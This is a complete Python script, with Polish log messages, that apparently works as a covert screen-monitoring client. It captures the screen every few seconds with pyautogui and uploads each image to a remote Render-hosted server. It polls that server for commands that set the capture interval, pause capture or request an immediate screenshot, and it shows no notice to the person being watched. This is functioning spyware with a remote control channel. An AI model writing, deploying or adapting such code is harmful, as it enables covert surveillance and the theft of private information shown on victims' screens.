import pyautogui
import requests
import time
import io
from PIL import Image
import os
import uuid
import json

ID_FILE = "user_id.txt"
if os.path.exists(ID_FILE):
    with open(ID_FILE, "r") as f:
        USER_ID = f.read().strip()
else:
    USER_ID = str(uuid.uuid4())[:8]
    with open(ID_FILE, "w") as f:
        f.write(USER_ID)

SERVER_URL = "https://zdalny-podglad.onrender.com"
UPLOAD_URL = f"{SERVER_URL}/upload"
COMMAND_URL = f"{SERVER_URL}/command?user={USER_ID}"

interval = 5
paused = False

def send_screenshot():
    screenshot = pyautogui.screenshot()
    buf = io.BytesIO()
    screenshot.save(buf, format='PNG')
    buf.seek(0)
    try:
        response = requests.post(
            UPLOAD_URL,
            data={"user": USER_ID},
            files={"screenshot": buf}
        )
        print(f"[{USER_ID}] Wysłano screen:", response.status_code)
    except Exception as e:
        print("Błąd wysyłania screena:", e)

def get_command():
    global interval, paused
    try:
        response = requests.get(COMMAND_URL, timeout=5)
        if response.status_code == 200:
            data = response.json()
            interval = data.get("interval", interval)
            paused = data.get("paused", paused)

            if data.get("one_shot"):
                print("[!] One shot!")
                send_screenshot()
                requests.post(COMMAND_URL, data={"action": "resume"})
    except Exception as e:
        print("Błąd pobierania komendy:", e)

while True:
    get_command()
    if not paused:
        send_screenshot()
    time.sleep(interval)
